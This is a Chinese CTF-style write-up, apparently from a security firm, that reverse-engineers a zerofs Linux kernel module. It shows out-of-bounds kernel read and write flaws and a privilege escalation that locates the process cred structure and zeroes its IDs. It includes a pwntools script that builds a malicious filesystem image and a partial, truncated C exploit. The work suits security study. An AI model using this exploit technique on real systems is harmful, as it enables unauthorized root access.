            blkdev_put(bdev, mode);
            down_write(&s->s_umount);
        } else {
            s->s_mode = mode;
            snprintf(s->s_id, sizeof(s->s_id), "%pg", bdev);
            sb_set_blocksize(s, block_size(bdev));
            error = fill_super(s, data, flags & SB_SILENT ? 1 : 0); //调用对应内核函数进行超级块的填充
            if (error) {
                deactivate_locked_super(s);
                goto error;
            }
            s->s_flags |= SB_ACTIVE;
            bdev->bd_super = s;
        }
zerofs文件系统中的`fs_flag`为`FS_REQUIRES_DEV`，类似于`ext2`、`ext4`等文件系统，挂载时需要物理设备作为输入，而默认的mount执行的参数中有`-o
loop`，即将输入文件作为硬盘分区挂接到系统上，类似于光盘文件的挂载。一般来说，我们可以通过命令`dd bs=4096 count=100
if=/dev/zero of=image`创建一个空白文件，然后通过`mkfs.ext2
image`将ext2的文件系统格式写入到image中，然后通过`mount -t ext2 ./image
/mnt`将它挂载到`/mnt`目录下，这里我们只能自己手动创建对应的zerofs文件系统。这里在逆向分析程序时存在如下问题：
后面尝试在自己编译的linux上安装模块时出现如下问题：
在经过一番搜索后发现内核以及模块可能使用了`rand_struct`这个gcc插件对特定的结构体进行了变量重排，也就是说改变了部分变量在结构体内部的内存偏移，此时在逆向分析时ghidra所识别的结构体偏移是无效的，同时也无法在有符号的内核上进行安装调试。
在后续分析过程中,看到有资料说该模块可能由[simplefs](https://github.com/psankar/simplefs)改写，因此可以查看源码对比二进制实现来更方便理解模块的各项功能。对比源码中的`fill_super`函数进行注释，如下：
    int zerofs_fill_super(super_block *sb,void *data,int silent)
    {
      astruct *superblock;
      long lVar1;
      undefined8 uVar2;
      zerofs_inode *pzVar3;
      list_head *plVar4;
      undefined4 in_register_00000014;
      undefined8 uVar5;
      uint uVar6;
      undefined auVar7 [16];
      xattr_handler **userdata;
      __fentry__(sb,data,CONCAT44(in_register_00000014,silent));
                        /* 获取第一块数据作为超级块结构 */
      superblock = (astruct *)
                   __bread_gfp((sb->s_writers).rw_sem[2].writer.task,0,*(undefined4 *)&sb->field_0x578,8
                              );
      if (superblock != (astruct *)0x0) {
        userdata = superblock->data;
          /* 判断超级块的前24字节是否符合zerofs定义 */
        if (((*userdata == (xattr_handler *)0x4f52455a) &&
            (userdata[1] == (xattr_handler *)0x1000)) &&
           (userdata[2] s_magic */
          (sb->s_writers).rw_sem[2].rw_sem.wait_list.prev = (list_head *)0x4f52455a;
                        /* sb->s_fsinfo */
          sb->s_xattr = userdata;
                        /* sb->s_maxbytes */
          (sb->rcu).next = (callback_head *)0x1000;
                        /* sb->s_op */
          sb->s_cop = (fscrypt_operations *)&zerofs_sops;
          lVar1 = new_inode(sb);
          *(undefined8 *)(lVar1 + 400) = 1;
          inode_init_owner(lVar1,0,0x4000);
          *(super_block **)(lVar1 + 600) = sb;
          *(inode_operations **)(lVar1 + 0x118) = &zerofs_inode_ops;
          *(file_operations **)(lVar1 + 0x30) = &zerofs_dir_ops;
          auVar7 = current_time(lVar1);
          uVar5 = SUB168(auVar7 >> 0x40,0);
          uVar2 = SUB168(auVar7,0);
          *(undefined8 *)(lVar1 + 0x148) = uVar5;
          *(undefined8 *)(lVar1 + 0x18) = uVar5;
          *(undefined8 *)(lVar1 + 0xa8) = uVar5;
          *(undefined8 *)(lVar1 + 0x140) = uVar2;
          *(undefined8 *)(lVar1 + 0x10) = uVar2;
          *(undefined8 *)(lVar1 + 0xa0) = uVar2;
          pzVar3 = zerofs_get_inode(sb,1);
          *(zerofs_inode **)(lVar1 + 0x168) = pzVar3;
          plVar4 = (list_head *)d_make_root(lVar1);
          (sb->s_writers).rw_sem[2].rw_sem.wait_list.next = plVar4;
          uVar6 = -(uint)(plVar4 == (list_head *)0x0) & 0xfffffff4;
        }
        else {
          uVar6 = 0xffffffea;
        }
        __brelse(superblock);
        return (int)uVar6;
      }
      do {
        invalidInstructionException();
      } while( true );
    }
结合simplefs可以判断出zerofs的基本块大小为0x1000,第1块内容为super_block，第二块内容为inode索引块，后面的为数据块。
inode结构如下：
    struct inode{
        int inode_number;
        int block_number;
        int mode;
        union {
            uint64_t file_size;
            uint64_t dir_children_count;
        };
    }
参考`mkfs-simplefs`可以构造出一个基本的符合挂载条件的zerofs文件系统。在构造过程中发现了`zerofs_lookup`的一个空指针解引用漏洞，代码如下：
经过研究发现无法利用，查看zerofs关于文件读写的函数，发现在文件读写过程中均存在漏洞，读文件如下：
可以看出，只要控制文件大小为-1，并在读取文件时设置好偏移，就可以实现内核地址越界读。文件写操作如下：
没有对当前文件的大小以及要写的偏移做判断，因此通过设置好文件偏移可以直接造成内核地址越界写。
现在我们拥有了内核地址越界读写的能力，接下来就是寻找内核提权的方式，上一篇文章中也提过除了通过调用`commit_creds(prepare_kernel_cred(0))`来实现提权，还可以通过定位进程中的`cred`结构并将对应的数据uid-fsgid全部置0的方式来提升程序权限。cred部分结构如下：
    struct cred {
        atomic_t    usage;
    #ifdef CONFIG_DEBUG_CREDENTIALS
        atomic_t    subscribers;    /* number of processes subscribed */
        void        *put_addr;
        unsigned    magic;
    #define CRED_MAGIC  0x43736564
    #define CRED_MAGIC_DEAD 0x44656144
    #endif
        kuid_t      uid;        /* real UID of the task */
        kgid_t      gid;        /* real GID of the task */
        kuid_t      suid;       /* saved UID of the task */
        kgid_t      sgid;       /* saved GID of the task */
        kuid_t      euid;       /* effective UID of the task */
        kgid_t      egid;       /* effective GID of the task */
        kuid_t      fsuid;      /* UID for VFS ops */
        kgid_t      fsgid;      /* GID for VFS ops */
        unsigned    securebits; /* SUID-less security managemen
由于当前有了内核越界读的能力，可以通过遍历内核地址数据来查找符合当前进程的cred结构内容，因为是普通用户权限，所以cred中的uid、gid、suid等数值都是1000，因此可以通过判断内存中连续3个32位整型的数值是否都是1000来定位cred结构。但是由于该内核编译时用了randstruct插件，破坏了部分结构体内部的变量排序，因此我们这边通过调试的方式定位cred结构中uid等变量的结构体偏移。通过中断函数`prepare_creds`
，观测到cred结构内容如下：
    gef➤  x /80wx $rsi
    0xffff95713f8a9300: 0xffffffff  0x0000003f  0x000003e8  0x00000003
    0xffff95713f8a9310: 0x00000000  0x00000000  0x3faa1080  0xffff9571
    0xffff95713f8a9320: 0x000003e8  0x000003e8  0x00000000  0x00000000
    0xffff95713f8a9330: 0x00000000  0x00000000  0x000003e8  0x00000000
    0xffff95713f8a9340: 0x00000000  0x00000000  0x00000000  0x00000000
    0xffff95713f8a9350: 0x3f813630  0xffff9571  0x00000000  0x00000000
    0xffff95713f8a9360: 0x00000000  0x00000000  0x000003e8  0x000003e8
    0xffff95713f8a9370: 0x00000000  0x00000000  0x00000000  0x00000000
    0xffff95713f8a9380: 0xb2c50660  0xffffffff  0x00000000  0x00000000
    0xffff95713f8a9390: 0x000003e8  0x00000000  0x00000000  0x00000000
    0xffff95713f8a93a0: 0x00000000  0x000003e8  0x00000000  0x00000000
    0xffff95713f8a93b0: 0x00000025  0x80000000  0x00000000  0x00000000
可以看到凡是为0x3e8即1000的基本都是对应的id值，同样可以通过函数`_sys_getgid`等来判断cred中的变量偏移，如下：
    .text:FFFFFFFF81094970 sub_FFFFFFFF81094970 proc near          ; CODE XREF: sub_FFFFFFFF81003960+54↑p
    .text:FFFFFFFF81094970                                         ; sub_FFFFFFFF81003A25+4B↑p ...
    .text:FFFFFFFF81094970                 call    nullsub_1
    .text:FFFFFFFF81094975                 push    rbp
    .text:FFFFFFFF81094976                 mov     rax, gs:off_D300
    .text:FFFFFFFF8109497F                 mov     rax, [rax+0B38h]
    .text:FFFFFFFF81094986                 mov     rbp, rsp
    .text:FFFFFFFF81094989                 mov     esi, [rax+6Ch]           //gid
    .text:FFFFFFFF8109498C                 mov     rdi, [rax+80h]
    .text:FFFFFFFF81094993                 call    sub_FFFFFFFF8112A300
    .text:FFFFFFFF81094998                 pop     rbp
    .text:FFFFFFFF81094999                 mov     eax, eax
    .text:FFFFFFFF8109499B                 retn
    .text:FFFFFFFF8109499B sub_FFFFFFFF81094970 endp
其中cred+0x6c处的值为gid，那么在定位cred结构体时就可以通过找到的偏移来对比。当找到第一个id为0x3e8时，剩下的id值偏移如下：6、7、12、24、25、34、39，将对应偏移的内容置0即可完成权限提升。由于我们先通过`mount`指令挂载文件系统，而后创建poc进程，因此poc进程的cred结构大概率来说是位于我们控制的越界读写的内核地址后面，所以直接从控制的内核地址向后不断搜索即可。
创建zerofs文件系统的脚本如下：
    from pwn import *
    zerofs_block0 = p64(0x4F52455A)+p64(0x1000)+p64(0x3)+p64(0)
    zerofs_block0 = zerofs_block0.ljust(0x1000,b"\x00")
    inode_block1 = p64(0x1)+p64(0x2)+p64(0x4000)+p64(1)
    inode_block1 +=p64(0x2)+p64(0x3)+p64(0x8000)+p64(0xffffffffffffffff)
    inode_block1 = inode_block1.ljust(0x1000,b"\x00")
    zerofs_block2 = b"test".ljust(256,b"\x00")
    zerofs_block2 += p64(2)
    zerofs_block2 = zerofs_block2.ljust(0x1000,b"\x00")
    zerofs_block3 = b"a"*0x1000
    block = zerofs_block0+inode_block1+zerofs_block2+zerofs_block3
    fimage = open("./tmp/zerofs.img","wb")
    fimage.write(block)
    fimage.close()
exp如下：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int current_uid = 0x3e8;
    int search_modify(int* buf)
    {
        for(int i=0;i=2)
            idx=strtol(argv[1],NULL,10);
        beginidx=idx;
        for (idx;idx
  2. 
**了解更多相关信息，请关注公众号“墨云安全”，关注更智能的网络攻防。**